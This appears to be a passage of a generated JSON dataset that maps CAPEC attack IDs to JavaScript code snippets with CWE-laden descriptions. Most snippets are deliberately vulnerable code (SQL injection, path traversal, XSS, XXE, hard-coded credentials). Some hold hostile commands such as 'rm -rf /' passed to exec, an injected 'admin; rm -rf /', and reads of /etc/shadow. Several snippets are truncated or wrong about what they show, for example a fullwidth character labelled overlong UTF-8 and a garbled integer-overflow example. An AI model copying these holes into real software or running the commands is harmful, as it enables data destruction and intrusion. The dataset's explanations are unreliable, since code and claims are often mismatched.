        "description": "This JavaScript code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack, leveraging CWE-352. It sends a GET request to delete a user's account on example.com, using the user's existing session cookie for authentication. The 'withCredentials' property is set to true, allowing the request to include user credentials. This attack relies on CWE-306 (Missing Authentication for Critical Function) and CWE-664 (Improper Control of a Resource Through its Lifetime) in the targeted application. Additionally, CWE-732 (Incorrect Permission Assignment for Critical Resource) and CWE-1275 (Sensitive Cookie with Improper SameSite Attribute) may also be relevant if the application does not properly secure its session cookies."
    },
    {
        "capec_id": "63",
        "code_snippet": "let userInput = '<script>alert(\"XSS\");</script>'; document.getElementById('userInput').innerHTML = userInput;",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability, where user-controllable input is not properly validated or neutralized, allowing an attacker to inject malicious scripts into the web page. The code takes user input and directly sets it as the innerHTML of an HTML element, bypassing any security controls and allowing the script to execute with the user's privilege level."
    },
    {
        "capec_id": "64",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/files/*', (req, res) => {\n  const filePath = req.params[0];\n  const decodedPath = decodeURIComponent(filePath);\n  const file = fs.readFileSync(decodedPath, 'utf8');\n  res.send(file);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable URL encoding handling in a Node.js Express.js server. The server uses the `decodeURIComponent` function to decode the URL path, but it does not properly validate or sanitize the input. An attacker can craft a URL with a sequence of special characters that, once decoded, will be equivalent to a forbidden URL. For example, the URL `/files/%2e%2e/%2e%2e/etc/passwd` will be decoded to `../etc/passwd`, allowing the attacker to access sensitive files. This code snippet embodies CWE-177, CWE-173, CWE-172, CWE-73, CWE-22, CWE-74, CWE-20, CWE-697, and CWE-707."
    },
    {
        "capec_id": "65",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/update.js', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    eval(xhr.responseText);\n  }\n};\nxhr.send();",
        "description": "JavaScript code that downloads and executes code from a remote location without verifying its integrity or origin, and transmits sensitive information in cleartext, making it vulnerable to sniffing and exploitation."
    },
    {
        "capec_id": "66",
        "code_snippet": "const mysql = require('mysql');\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/users', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT * FROM users WHERE username = '${username}'`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send({ message: 'Error: ' + err.sqlMessage });\n    } else {\n      res.send(results);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a SQL injection vulnerability. The 'username' parameter from the query string is directly inserted into the SQL query without proper validation or sanitization, allowing an attacker to inject malicious SQL code. The error handling also includes the sensitive error message, which can provide additional information to the attacker."
    },
    {
        "capec_id": "67",
        "code_snippet": "const syslog = require('syslog');\n\nfunction logMessage(message) {\n  syslog(message);\n}\n\nconst userInput = 'Hello %s %s %s';\nlogMessage(userInput);\n",
        "description": "This code snippet demonstrates a format string injection vulnerability in a JavaScript application that uses the syslog() function insecurely. The syslog() function is called with user input as the format string, allowing an attacker to inject malicious format string commands, potentially leading to a buffer overflow."
    },
    {
        "capec_id": "68",
        "code_snippet": "const crypto = require('crypto');\nconst weakHash = crypto.createHash('md5'); // CWE-328: Use of Weak Hash\nconst codeToSign = 'malicious_code();';\nconst signature = weakHash.update(codeToSign).digest('hex');\n\n// CWE-325: Missing Cryptographic Step - no salt or initialization vector used\nconst encryptedCode = crypto.createCipher('aes-256-cbc', 'weakKey').update(codeToSign);\n\n// CWE-506: Embedded Malicious Code - malicious code embedded in the script\neval(encryptedCode.toString());\n\n// CWE-733: Compiler Optimization Removal or Modification of Security-critical Code - compiler optimization may remove or modify security checks\nif (process.env.NODE_ENV === 'production') {\n  // security checks may be removed or modified by compiler optimization\n  console.log('Security checks may be bypassed in production environment.');\n}\n\n// CWE-1326: Missing Immutable Root of Trust in Hardware - assuming a vulnerable hardware setup\nif (process.env.HARDWARE_SETUP === 'vulnerable') {\n  // immutable root of trust is missing, allowing bypass of secure boot\n  console.log('Vulnerable hardware setup detected.');\n}",
        "description": "This JavaScript code snippet demonstrates a code signing subversion attack by using a weak hash function (MD5), missing cryptographic steps, embedded malicious code, and potential compiler optimization removal of security checks. It also assumes a vulnerable hardware setup with a missing immutable root of trust, allowing bypass of secure boot."
    },
    {
        "capec_id": "69",
        "code_snippet": "const admin = require('child_process');\nconst userInput = \"rm -rf /\";\nadmin.exec(userInput, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of executing arbitrary code with elevated privileges. It uses the child_process module to execute a system command with elevated privileges, without proper input validation or sanitization. The userInput variable is set to 'rm -rf /', which is a malicious command that can cause damage to the system. This code is vulnerable to OS Command Injection (CWE-78) and allows an attacker to execute arbitrary commands with elevated privileges. The code also runs with unnecessary privileges (CWE-250), allowing an attacker to exploit the system further. Additionally, the code does not properly neutralize special elements in the OS command, making it vulnerable to CWE-114. The code also contains embedded malicious code (CWE-506) and allows external control of system or configuration settings (CWE-15)."
    },
    {
        "capec_id": "70",
        "code_snippet": "const adminUser = { username: 'admin', password: 'password' };\nconst defaultUsers = [{ username: 'guest', password: '' }, { username: 'user', password: 'secret' }];\n\nfunction authenticate(username, password) {\n  if (username === adminUser.username && password === adminUser.password) {\n    return true;\n  }\n  for (let i = 0; i < defaultUsers.length; i++) {\n    if (username === defaultUsers[i].username && password === defaultUsers[i].password) {\n      return true;\n    }\n  }\n  return false;\n}\n\n// Example usage:\nconsole.log(authenticate('admin', 'password')); // true\nconsole.log(authenticate('guest', '')); // true\nconsole.log(authenticate('user', 'secret')); // true",
        "description": "This code snippet demonstrates a vulnerable authentication system that uses weak password requirements, hard-coded credentials, and single-factor authentication. The system has a default admin user with a weak password, and also allows login with empty passwords or common passwords like 'secret'. This makes it easy for an attacker to gain unauthorized access to the system."
    },
    {
        "capec_id": "71",
        "code_snippet": "const userInput = \"\\u0048\\u0065\\u006c\\u006c\\u006f\"; // Unicode encoded string\nconst filter = /hello/i;\nif (!filter.test(userInput)) {\n  console.log(\"Input is safe\");\n  // Process the input\n} else {\n  console.log(\"Input is malicious\");\n  // Block the input\n}",
        "description": "This code snippet demonstrates the CAPEC of circumventing a content filter using Unicode encoding. The userInput variable contains a Unicode encoded string that represents the word 'hello'. The filter is a regular expression that checks for the presence of the word 'hello' in a case-insensitive manner. However, the filter is not Unicode aware and does not properly handle the Unicode encoding, allowing the malicious input to slip past the filter. This code snippet embodies CWE-176: Improper Handling of Unicode Encoding, CWE-179: Incorrect Behavior Order: Early Validation, and CWE-20: Improper Input Validation."
    },
    {
        "capec_id": "72",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/download/:file', (req, res) => {\n  const file = req.params.file;\n  const filePath = `./uploads/${file}`;\n  res.download(filePath);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an adversary to take advantage of the multiple ways of encoding a URL. The code uses Express.js to create a server that allows users to download files from the ./uploads directory. The file name is taken from the URL parameter, but it is not properly validated or encoded, making it vulnerable to CWE-20: Improper Input Validation, CWE-73: External Control of File Name or Path, and CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'). An attacker can exploit this by sending a specially crafted URL with a malicious file name, such as '%2e%2e%2fetc%2fpasswd', to access sensitive files or inject malicious code."
    },
    {
        "capec_id": "73",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/download/:filename', (req, res) => {\n  const filename = req.params.filename;\n  const file = `uploads/${filename}`;\n  res.download(file);\n});\n\napp.post('/upload', (req, res) => {\n  const file = req.body.file;\n  const filename = req.body.filename;\n  fs.writeFileSync(`uploads/${filename}`, file);\n  res.send(`File uploaded successfully!`);\n});",
        "description": "This code snippet demonstrates a vulnerable Express.js application that allows an attacker to inject malicious code into a filename, which can lead to XSS redirection or code execution. The application does not validate user input, allowing an attacker to upload a file with a malicious filename that can be used to inject XSS payloads. The CWEs embodied in this code snippet include CWE-20 (Improper Input Validation), CWE-184 (Incomplete List of Disallowed Inputs), CWE-96 (Improper Neutralization of Directives in Statically Saved Code), CWE-348 (Use of Less Trusted Source), CWE-116 (Improper Encoding or Escaping of Output), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "74",
        "code_snippet": "const userState = {\n  username: 'user123',\n  paymentInfo: 'creditCard123',\n  cart: ['item1', 'item2']\n};\n\n// CWE-372: Incomplete Internal State Distinction\nfunction processPayment() {\n  if (userState.paymentInfo === 'creditCard123') {\n    // assume user is in 'paid' state\n    console.log('Payment successful!');\n  } else {\n    // but actually, user is in 'unpaid' state\n    console.log('Payment failed!');\n  }\n}\n\n// CWE-315: Cleartext Storage of Sensitive Information in a Cookie\nconst cookie = 'username=' + userState.username + '; paymentInfo=' + userState.paymentInfo;\nconsole.log(cookie);\n\n// CWE-353: Missing Support for Integrity Check\nconst data = 'userState=' + JSON.stringify(userState);\nsocket.send(data);\n\n// CWE-693: Protection Mechanism Failure\nfunction validateUserState() {\n  // no validation performed\n  return true;\n}\n\n// CWE-1245: Improper Finite State Machines (FSMs) in Hardware Logic\nconst fsm = {\n  state: 'init',\n  transition: function(event) {\n    if (event === 'paymentReceived') {\n      this.state = 'paid';\n    } else if (event === 'paymentFailed') {\n      this.state = 'unpaid';\n    } else {\n      // undefined state\n      this.state = 'unknown';\n    }\n  }\n};\n\n// CWE-1253: Incorrect Selection of Fuse Values\nconst fuse = {\n  blown: false,\n  setSecureState: function() {\n    if (!this.blown) {\n      console.log('System is secure');\n    } else {\n      console.log('System is insecure');\n    }\n  }\n};\n\n// CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\nfunction nonReentrantCode() {\n  console.log('Non-reentrant code executed');\n  nestedCall();\n}\nfunction nestedCall() {\n  nonReentrantCode();\n}\n\n// CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\nconst securitySettings = {\n  initialized: false,\n  reset: function() {\n    this.initialized = false;\n  }\n};",
        "description": "This code snippet demonstrates the CAPEC of modifying state information maintained by the target software or causing a state transition in hardware. It includes various CWEs such as incomplete internal state distinction, cleartext storage of sensitive information in a cookie, missing support for integrity check, protection mechanism failure, improper finite state machines in hardware logic, incorrect selection of fuse values, unintended reentrant invocation of non-reentrant code via nested calls, and uninitialized value on reset for registers holding security settings. These vulnerabilities can be exploited by an adversary to elevate privileges, conduct fraudulent transactions, or cause a denial of service."
    },
    {
        "capec_id": "75",
        "code_snippet": "const fs = require('fs');\nconst repoPath = './repository';\n\n// CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\nconst untrustedData = fs.readFileSync(repoPath + '/untrustedFile.txt', 'utf8');\nconst trustedData = fs.readFileSync(repoPath + '/trustedFile.txt', 'utf8');\nconst combinedData = trustedData + untrustedData;\n\n// CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nconst resourceId = combinedData;\nconst command = `git add ${resourceId}`;\n\n// CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\nconst childProcess = require('child_process');\nchildProcess.exec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});\n\n// CWE-346: Origin Validation Error\nconst origin = 'untrusted-origin';\nconst data = fs.readFileSync(repoPath + '/' + origin + '.txt', 'utf8');\n\n// CWE-353: Missing Support for Integrity Check\nconst transmissionProtocol = 'unsecured-protocol';\nconst dataTransmission = transmissionProtocol + ':' + data;\n\n// CWE-354: Improper Validation of Integrity Check Value\nconst checksum = 'invalid-checksum';\nconst receivedData = dataTransmission + ':' + checksum;",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that allows an attacker to modify trusted files in a CVS repository, gaining unauthorized access to the application. The code combines trusted and untrusted data, injects malicious resource identifiers, and executes commands with untrusted input. It also lacks origin validation, uses an unsecured transmission protocol, and fails to properly validate integrity check values."
    },
    {
        "capec_id": "76",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../etc/passwd';\nfs.readFile(userInput, (err, data) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  console.log(data);\n});",
        "description": "This JavaScript code snippet demonstrates a path traversal vulnerability (CWE-23, CWE-22) where user input is used to construct a file path without proper validation, allowing an attacker to access sensitive files outside of the intended directory. The code uses the 'fs' module to read a file specified by the user, which can be manipulated to traverse to a higher directory using sequences like '..'. This can lead to unauthorized access to sensitive files, violating the principle of least privilege (CWE-272) and improper authorization (CWE-285). Additionally, the code does not properly neutralize special elements in the input (CWE-74) and does not verify the origin of the input (CWE-346), making it vulnerable to command injection (CWE-77) and link following (CWE-59) attacks."
    },
    {
        "capec_id": "77",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  if (req.query.isAdmin) {\n    isAdmin = req.query.isAdmin;\n  }\n  if (isAdmin) {\n    res.send('Welcome Admin!');\n  } else {\n    res.send('Access Denied!');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates the CAPEC, where an adversary can override variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In this example, the 'isAdmin' variable is set based on the query parameter, allowing an attacker to bypass authentication by setting isAdmin=true in the URL."
    },
    {
        "capec_id": "78",
        "code_snippet": "const userInput = '\\\\..\\\\/secretFile';\nconst filteredInput = userInput.replace('..', '');\nconst canonicalizedInput = filteredInput.replace(/\\\\\\\\/g, '/');\nconst filePath = \\`/uploads/${canonicalizedInput}\\`;\nfs.readFile(filePath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of using alternate encoding to bypass security filters. The userInput variable contains a malicious path traversal attempt using backslash encoding. The code attempts to filter out the '..' sequence, but the canonicalization step that replaces backslashes with forward slashes occurs after filtering, allowing the attack to succeed. This code embodies CWEs 180, 181, 173, 172, 73, 22, 74, 20, 697, and 707."
    },
    {
        "capec_id": "79",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/files/*', (req, res) => {\n  const filePath = req.params[0].replace(/\\/g, '/');\n  if (filePath.startsWith('/')) {\n    filePath = filePath.substring(1);\n  }\n  const file = filePath.split('/').pop();\n  if (file) {\n    res.sendFile(`${__dirname}/../files/${file}`);\n  } else {\n    res.status(404).send('File not found');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to directory traversal attacks due to improper handling of slash characters. The code uses the express.js framework to create a server that serves files from a directory. The vulnerability lies in the way the code handles the filePath variable, which can be manipulated by an attacker to access files outside of the intended directory. The code does not properly validate or canonicalize the input, allowing an attacker to use alternate encoding to bypass filters and access sensitive information."
    },
    {
        "capec_id": "80",
        "code_snippet": "const userInput = '%EF%BC%BF'; // Overlong UTF-8 encoding for the character '/'\nconst filePath = userInput + 'example.txt';\nconst fs = require('fs');\nfs.readFile(filePath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC attack by using an overlong UTF-8 encoding for the character '/' in the user input. The input is not properly validated, allowing the attacker to inject a malicious file path. The code uses the CWE-73 External Control of File Name or Path and CWE-20 Improper Input Validation weaknesses to create a vulnerability. The fs.readFile function is used to read the file, but the input is not properly sanitized, allowing the attacker to access unauthorized files."
    },
    {
        "capec_id": "81",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.post('/log', (req, res) => {\n  const logData = req.body.logData;\n  fs.appendFile('log.txt', logData + '\\n', (err) => {\n    if (err) {\n      console.error(err);\n      res.status(500).send('Error writing to log');\n    } else {\n      res.send('Log written successfully');\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable web log tampering attack. The express.js server accepts POST requests to the '/log' endpoint, which appends the received log data to a file named 'log.txt'. The log data is not sanitized, allowing an attacker to inject malicious data, including CRLF sequences, into the log file. This can lead to log injection, tampering, or forging attacks, as described in the related CWEs."
    },
    {
        "capec_id": "82",
        "code_snippet": "const parser = new DOMParser();\nconst xmlDoc = parser.parseFromString('<!ENTITY xxe \"../../../../../etc/passwd\"> <doc>&xxe;</doc>', 'text/xml');\nconst xpath = xmlDoc.evaluate('//doc', xmlDoc, null, XPathResult.ANY_TYPE, null);\nconst result = xpath.iterateNext();\nconsole.log(result.childNodes[0].nodeValue);",
        "description": "This JavaScript code snippet demonstrates CWE-611: Improper Restriction of XML External Entity Reference and CWE-776: Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion'). It uses a DOMParser to parse an XML document with an external entity reference, allowing an attacker to access sensitive files like /etc/passwd. The code then uses XPath to evaluate the XML document and log the contents of the referenced file."
    },
    {
        "capec_id": "83",
        "code_snippet": "const xpath = \"//user[username='\" + userInput + \"' and password='\" + userInput + \"']\";\nconst xmlDoc = new DOMParser().parseFromString(xmlData, \"text/xml\");\nconst users = xmlDoc.evaluate(xpath, xmlDoc, null, XPathResult.ANY_TYPE, null);\nconst result = users.iterateNext();\nif (result) {\n  console.log(\"Authenticated successfully!\");\n} else {\n  console.log(\"Authentication failed.\");\n}",
        "description": "This code snippet demonstrates XPath Injection vulnerability. It takes user input and uses it to construct an XPath expression to query an XML database. The input is not properly sanitized, allowing an attacker to inject malicious XPath expressions to bypass authentication or retrieve sensitive information."
    },
    {
        "capec_id": "84",
        "code_snippet": "const xq = require('xquery');\nconst xmldb = require('xmldb');\n\nlet db = xmldb.getDatabase('mydb');\nlet query = 'for $i in collection(\"mycollection\") where $i/name = \"' + userInput + '\" return $i';\n\ntry {\n  let result = xq.eval(query, db);\n  console.log(result);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This code snippet is vulnerable to XQuery Injection (CWE-652) as it takes user input and directly injects it into an XQuery expression without proper validation or sanitization. An attacker could manipulate the input to inject malicious XQuery commands, allowing them to traverse and execute commands that the XQuery routines have access to. This is similar to SQL Injection (CWE-89) and XPath Injection (CWE-643), and is a result of Improper Neutralization of Special Elements (CWE-74 and CWE-707)."
    },
    {
        "capec_id": "85",
        "code_snippet": "const xhr = new XMLHttpRequest();\nconst targetUrl = 'https://example.com';\nconst params = 'param1=value1&param2=value2';\n\nxhr.open('GET', targetUrl + '?' + params, true);\n\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const response = xhr.responseText;\n    const scriptTag = '<script>alert(\"XSS\")</script>';\n    const maliciousHtml = response.replace(/<body>/, '<body>' + scriptTag);\n    document.write(maliciousHtml);\n  }\n};\n\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates an Ajax-based vulnerability scanner that exploits multiple CWEs, including CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation), CWE-116 (Improper Encoding or Escaping of Output), and CWE-692 (Incomplete Denylist to Cross-Site Scripting). The code sends a GET request to a target URL with user-controllable input, and then injects a malicious script tag into the response HTML, allowing for XSS attacks. The code also lacks proper input validation, encoding, and escaping, making it vulnerable to various attacks."
    },
    {
        "capec_id": "86",
        "code_snippet": "const userInput = '<script>alert(\"XSS\")</script>'; const httpResponse = { headers: { 'Set-Cookie': userInput } };",
        "description": "This code snippet demonstrates a vulnerable HTTP response that sets a cookie based on unvalidated user input, allowing an attacker to inject malicious scripts through the Set-Cookie header."
    },
    {
        "capec_id": "87",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin/deleteUser', (req, res) => {\n  const userId = req.query.userId;\n  // No authorization check, allowing direct access to sensitive operation\n  deleteUser(userId);\n  res.send(`User ${userId} deleted`);\n});\n\napp.get('/admin/config', (req, res) => {\n  const config = getConfig();\n  // Sensitive information exposed in query string\n  res.redirect(`/admin/config?apiKey=${config.apiKey}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates forceful browsing vulnerabilities. The '/admin/deleteUser' endpoint allows direct access to a sensitive operation without proper authorization checks (CWE-425, CWE-285). The '/admin/config' endpoint exposes sensitive information in the query string (CWE-598). An attacker can exploit these vulnerabilities by directly accessing these endpoints, bypassing any intended access controls."
    },
    {
        "capec_id": "88",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getUserDetails(username) {\n  const command = `cat /etc/passwd | grep ${username}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\ngetUserDetails('admin');",
        "description": "This code snippet is vulnerable to OS command injection. The function getUserDetails takes a username as input and constructs a command to retrieve the user details from the /etc/passwd file. However, it does not validate or sanitize the input, allowing an attacker to inject arbitrary OS commands. For example, if an attacker passes 'admin; rm -rf /' as the username, the code will execute the rm -rf / command, deleting all files on the system."
    },
    {
        "capec_id": "89",
        "code_snippet": "const dns = require('dns');\n\nfunction getHostname(ip) {\n  return new Promise((resolve, reject) => {\n    dns.reverse(ip, (err, hostname) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve(hostname);\n      }\n    });\n  });\n}\n\nasync function handleRequest(req, res) {\n  const ip = req.ip;\n  const hostname = await getHostname(ip);\n  if (hostname === 'trusted-bank.com') {\n    // trust the request\n    res.send('Welcome to trusted-bank.com!');\n  } else {\n    res.send('Access denied.');\n  }\n}\n\n// assume this is an express.js server\napp.get('/', handleRequest);\n",
        "description": "This code snippet demonstrates a pharming attack vulnerability. The server trusts the client's IP address and performs a reverse DNS resolution to obtain the hostname. If the hostname matches a trusted domain (e.g., 'trusted-bank.com'), the server grants access. However, an attacker can manipulate the client's IP address and DNS resolution to impersonate the trusted domain, allowing them to access the server. This code combines CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) and CWE-602 (Client-Side Enforcement of Server-Side Security) to create a pharming attack vulnerability."
    },
    {
        "capec_id": "90",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const challenge = Math.floor(Math.random() * 10000);\n  res.cookie('challenge', challenge);\n  res.send(`Please respond with the challenge: ${challenge}`);\n});\n\napp.post('/login-response', (req, res) => {\n  const username = req.body.username;\n  const response = req.body.response;\n  const challenge = req.cookies.challenge;\n  if (response === challenge) {\n    // Authentication successful, but vulnerable to reflection attack\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid response');\n  }\n});",
        "description": "This code snippet demonstrates a simple authentication protocol vulnerable to a reflection attack (CWE-301). The server generates a random challenge and sends it to the client. The client is expected to respond with the same challenge, but an attacker can intercept the challenge and respond with it, impersonating the legitimate user. The code also has incorrect implementation of the authentication algorithm (CWE-303) and is susceptible to authentication bypass by capture-replay (CWE-294), primary weakness (CWE-305), and spoofing (CWE-290)."
    },
    {
        "capec_id": "91",
        "code_snippet": "const userInput = \\",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to XSS attacks. It takes user-controlled input and injects it into an HTML IMG tag without proper sanitization or neutralization of script elements, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "92",
        "code_snippet": "function vulnerableFunction(size) {\n  var buffer = new Array(size);\n  var offset = 0;\n  while (offset < size) {\n    buffer[offset] = 1;\n    offset = offset + 2147483647; // integer overflow\n  }\n  return buffer;\n}\n\nvulnerableFunction(10);",
        "description": "This JavaScript code snippet demonstrates an integer overflow vulnerability. The function vulnerableFunction() takes an integer size as input and allocates an array of that size. It then enters a loop where it increments the offset variable by a large value (2^31-1), causing an integer overflow. This can lead to unexpected behavior, such as a buffer overflow, as the offset variable wraps around to a small or negative value. This is an example of CWE-190 (Integer Overflow or Wraparound) and CWE-680 (Integer Overflow to Buffer Overflow)."
    },
    {
        "capec_id": "93",
        "code_snippet": "const logFile = require('fs').createWriteStream('log.txt', { flags: 'a' });\n\nfunction logMessage(message) {\n  logFile.write(`${message}\\n`);\n}\n\nconst userInput = \"<script>alert('XSS')</script>\";\nlogMessage(userInput);\nlogMessage(`User IP: ${getUserIP()}`);\nlogMessage(`User Credentials: ${getUserCredentials()}`);\n\nfunction getUserIP() {\n  return req.headers['x-forwarded-for'] || req.connection.remoteAddress;\n}\n\nfunction getUserCredentials() {\n  return req.body.username + ':' + req.body.password;\n}",
        "description": "This code snippet demonstrates the CAPEC attack by injecting malicious log entries into a log file. The logMessage function writes user-controlled input to the log file without proper sanitization, allowing for special element injection (CWE-75) and improper output neutralization for logs (CWE-117). The code also logs sensitive information, such as user IP addresses and credentials, which can aid an attacker (CWE-532). Furthermore, the excessive logging of information can make log files hard to process and hinder recovery efforts (CWE-779)."
    },
    {
        "capec_id": "94",
        "code_snippet": "const https = require('https');\n\nconst server = https.createServer((req, res) => {\n  // CWE-300: Channel Accessible by Non-Endpoint\n  // No verification of client identity\n  const clientCert = req.socket.getPeerCertificate();\n  if (!clientCert) {\n    // CWE-287: Improper Authentication\n    // Insufficient authentication, allowing spoofing attacks\n    res.writeHead(200);\n    res.end('Authenticated!');\n  } else {\n    res.writeHead(401);\n    res.end('Unauthorized');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});\n\n// CWE-290: Authentication Bypass by Spoofing\n// CWE-294: Authentication Bypass by Capture-replay\n// CWE-593: Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created\n// An attacker can capture the client's request, modify the SSL context, and replay it to bypass authentication\nconst attacker = https.request({\n  hostname: 'localhost',\n  port: 3000,\n  method: 'GET',\n  path: '/'\n}, (res) => {\n  console.log(`Attacker received response: ${res.statusCode}`);\n});\nattacker.write('');\nattacker.end();",
        "description": "This code snippet demonstrates a vulnerable server that does not properly verify client identity, allowing an attacker to bypass authentication by spoofing or capturing and replaying requests. The server does not adequately ensure the integrity of the communication channel, making it accessible to non-endpoint actors."
    },
    {
        "capec_id": "95",
        "code_snippet": "const soap = require('soap');\nconst express = require('express');\nconst app = express();\n\napp.get('/wsdl', (req, res) => {\n  const wsdl = {\n    'definitions': {\n      'service': {\n        'port': {\n          'binding': {\n            'operation': {\n              'input': {\n                'message': {\n                  'part': {\n                    'element': {\n                      'complexType': {\n                        'sequence': {\n                          'element': {\n                            'complexType': {\n                              'sequence': {\n                                'element': {\n                                  'name': 'username',\n                                  'type': 'xsd:string'\n                                },\n                                'element': {\n                                  'name': 'password',\n                                  'type': 'xsd:string'\n                                }\n                              }\n                            }\n                          }\n                        }\n                      }\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  };\n  res.set('Content-Type', 'text/xml');\n  res.send(`<?xml version=\\",
        "description": "This code snippet is a vulnerable WSDL interface made available by a web service. The WSDL file is exposed and contains sensitive information about the service's ports and bindings. An attacker can scan this interface to reveal sensitive information and potentially perform more serious attacks such as parameter tampering, malicious content injection, command injection, etc. The code also uses the GET request method with sensitive query strings, which can be accessed by unauthorized actors."
    },
    {
        "capec_id": "96",
        "code_snippet": "const fs = require('fs');\n\ntry {\n  fs.readFile('/etc/shadow', (err, data) => {\n    if (err) {\n      // CWE-589: Call to Non-ubiquitous API\n      // The 'readFileSync' function may not exist on all versions of Node.js\n      const fileContent = fs.readFileSync('/etc/shadow');\n      console.log(fileContent);\n    } else {\n      console.log(data);\n    }\n  });\n} catch (e) {\n  // CWE-1177: Use of Prohibited Code\n  // The 'child_process' module is prohibited in this context\n  const exec = require('child_process').exec;\n  exec('cat /etc/shadow', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\n// CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\nconst buffer = Buffer.alloc(10);\nbuffer.write('Hello, World!', 20);\nconsole.log(buffer);\n\n// CWE-1322: Use of Blocking Code in Single-threaded, Non-blocking Context\nconst express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n  // Blocking code in a single-threaded, non-blocking context\n  const data = fs.readFileSync('large_file.txt');\n  res.send(data);\n});\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('untrusted-library');\nuntrustedLibrary.doSomething();",
        "description": "This code snippet demonstrates the CAPEC of blocked access to external libraries, which can lead to insecure states. It includes several CWEs, such as calling non-ubiquitous APIs, using prohibited code, improper restriction of operations within memory buffers, using blocking code in single-threaded contexts, and including functionality from untrusted control spheres."
    },
    {
        "capec_id": "97",
